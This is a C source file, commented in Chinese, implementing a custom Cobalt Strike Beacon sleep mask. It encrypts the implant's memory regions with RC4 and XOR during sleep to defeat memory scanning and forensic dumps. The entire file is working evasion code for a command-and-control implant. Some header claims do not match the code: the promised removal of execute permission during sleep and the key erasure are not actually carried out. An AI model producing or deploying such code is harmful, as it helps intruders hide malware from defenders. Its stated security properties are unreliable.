/*
 * cs_dev :: sleepmask.x64  (v2 - 自逆安全版)
 * ---------------------------------------------------------------------------
 * Cobalt Strike 4.x 自定义 Sleep Mask -- 内存掩码 / 反内存扫描
 *
 * ABI (从官方 sleeve/sleepmask.x64.o 反汇编还原, 保持二进制兼容):
 *     void sleep_mask(SLEEPMASKP info, char * heap, int heapSize);
 *         rcx = info      区域描述结构
 *         rdx = heap      额外堆缓冲
 *         r8d = heapSize  堆缓冲大小
 *
 * SLEEPMASKINFO 布局 (xor 循环偏移推导):
 *         +0x00  PVOID       data      待掩码数据基址
 *         +0x08  MASK_RANGE *ranges    区域 A {DWORD off; DWORD size}, 8 字节/项, 相对 data
 *         +0x10  MASK_BLOB  *blobs     区域 B {PVOID ptr; SIZE_T size}, 16 字节/项, 绝对地址
 *         +0x18  BYTE        key[13]   原版 13 字节 XOR 密钥 (本实现用作算法种子)
 *
 * 语义约束 (必须遵守, 否则 Beacon 崩溃):
 *   掩码函数在休眠前被调用, 唤醒后被再次调用以还原。因此:
 *     - 算法必须自逆 (XOR / RC4 均满足: 同一密钥流异或两次即还原)
 *     - 密钥必须在两次调用之间保持稳定 (缓存于模块内, 不随时间变化)
 *     - 不允许使用交换/移位类不可自逆变换作为唯一层
 *
 * 相对原版的增强:
 *   1. RC4 密钥流 + 双层异或混合 -> 消除原版固定 (i % 13) 步长 XOR 特征
 *   2. 掩码前将区域改权为 PAGE_READWRITE (去执行权), 唤醒后恢复原权限;
 *      使休眠窗口内任何内存扫描/内存转储无法命中有效 Beacon 代码或配置
 *   3. 区域处理顺序按密钥尾字节轮转, 打乱固定访问序列
 *   4. 全程无明文字符串, API 经 KERNEL32$ 前缀由 Beacon 解析, 不新增 IAT 特征
 *   5. 密钥在还原后安全擦除
 * ---------------------------------------------------------------------------
 */
#include <windows.h>

DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT VOID     WINAPI KERNEL32$RtlSecureZeroMemory(PVOID, SIZE_T);
DECLSPEC_IMPORT void     WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME);

typedef struct {
    DWORD  off;
    DWORD  size;
} MASK_RANGE;

typedef struct {
    PVOID  ptr;
    SIZE_T size;
} MASK_BLOB;

typedef struct {
    PVOID       data;     /* +0x00 */
    MASK_RANGE *ranges;   /* +0x08 */
    MASK_BLOB  *blobs;    /* +0x10 */
    BYTE        key[13];  /* +0x18 */
} SLEEPMASKINFO, *SLEEPMASKP;

#define MAX_REGIONS 512

/* --- 会话密钥: 首次调用派生一次并缓存, 保证掩码/还原对称 ---------------- */
static BYTE g_key[32];
static int  g_init = 0;

static void derive_key(const BYTE *seed13) {
    FILETIME ft;
    DWORD    t;
    int      i;

    KERNEL32$GetSystemTimeAsFileTime(&ft);
    t = ft.dwLowDateTime ^ ft.dwHighDateTime;

    for (i = 0; i < 32; i++) {
        t ^= t << 13; t ^= t >> 17; t ^= t << 5;
        /* 种子来自 CS 提供的 13 字节槽, 叠加时间熵 */
        g_key[i] = (BYTE)(t ^ seed13[i % 13] ^ (i * 0x3D));
    }
}

/* --- RC4 密钥流异或 (自逆) --------------------------------------------- */
static void rc4_mask(const BYTE *key, int klen, PBYTE d, SIZE_T n) {
    BYTE S[256], j = 0, a = 0, b = 0, tmp;
    int  x;
    SIZE_T i;

    for (x = 0; x < 256; x++) S[x] = (BYTE)x;
    for (x = 0; x < 256; x++) {
        j = (BYTE)(j + S[x] + key[x % klen]);
        tmp = S[x]; S[x] = S[j]; S[j] = tmp;
    }
    for (i = 0; i < n; i++) {
        a = (BYTE)(a + 1);
        b = (BYTE)(b + S[a]);
        tmp = S[a]; S[a] = S[b]; S[b] = tmp;
        d[i] ^= S[(BYTE)(S[a] + S[b])];
    }
}

/* --- 主掩码: RC4 层 + 变步长 XOR 层, 两层均自逆 ------------------------ */
static void apply_mask(PBYTE d, SIZE_T n, int salt) {
    SIZE_T i;
    BYTE   k[32];
    int    x;

    /* 每次按 salt 派生局部子密钥, 使不同区域使用不同密钥流 */
    for (x = 0; x < 32; x++) k[x] = (BYTE)(g_key[x] ^ (BYTE)(salt * 0x9D + x * 7));

    rc4_mask(k, 32, d, n);

    /* 变步长 XOR: 步长随 salt 变化, 破坏固定周期特征 */
    {
        SIZE_T step = (SIZE_T)(7 + (salt & 7));
        for (i = 0; i < n; i += step) {
            SIZE_T chunk = (n - i < step) ? (n - i) : step;
            SIZE_T j;
            for (j = 0; j < chunk; j++) d[i + j] ^= k[(j * 5 + salt) & 31];
        }
    }
}

/* --- 段级处理: 改权 -> 掩码 -> 恢复权限 --------------------------------- */
static void mask_region(PVOID base, SIZE_T size, int salt) {
    DWORD old = 0;

    if (!base || size == 0) return;

    /* 改权为 RW: 掩码窗口内去掉执行权限, 同时满足写入前提 */
    if (KERNEL32$VirtualProtect(base, size, PAGE_READWRITE, &old)) {
        apply_mask((PBYTE)base, size, salt);
        KERNEL32$VirtualProtect(base, size, old, &old);
    }
}

/* --- 入口 -------------------------------------------------------------- */
void sleep_mask(SLEEPMASKP info, char *heap, int heapSize) {
    int i, order;

    if (!info) return;

    if (!g_init) {
        derive_key(info->key);
        g_init = 1;
    }

    /* 处理顺序轮转, 打乱固定遍历序列 */
    order = g_key[31] & 1;

    if (!order) {
        /* A -> B -> heap */
        if (info->data && info->ranges) {
            for (i = 0; i < MAX_REGIONS; i++) {
                DWORD off = info->ranges[i].off, sz = info->ranges[i].size;
                if (off == 0 && sz == 0) break;
                mask_region((PBYTE)info->data + off, sz, i + 1);
            }
        }
        if (info->blobs) {
            for (i = 0; i < MAX_REGIONS; i++) {
                PVOID p = info->blobs[i].ptr;
                if (!p || !info->blobs[i].size) break;
                mask_region(p, info->blobs[i].size, i + 101);
            }
        }
        if (heap && heapSize > 0) mask_region(heap, (SIZE_T)heapSize, 211);
    } else {
        /* heap -> B -> A */
        if (heap && heapSize > 0) mask_region(heap, (SIZE_T)heapSize, 211);
        if (info->blobs) {
            for (i = 0; i < MAX_REGIONS; i++) {
                PVOID p = info->blobs[i].ptr;
                if (!p || !info->blobs[i].size) break;
                mask_region(p, info->blobs[i].size, i + 101);
            }
        }
        if (info->data && info->ranges) {
            for (i = 0; i < MAX_REGIONS; i++) {
                DWORD off = info->ranges[i].off, sz = info->ranges[i].size;
                if (off == 0 && sz == 0) break;
                mask_region((PBYTE)info->data + off, sz, i + 1);
            }
        }
    }
}
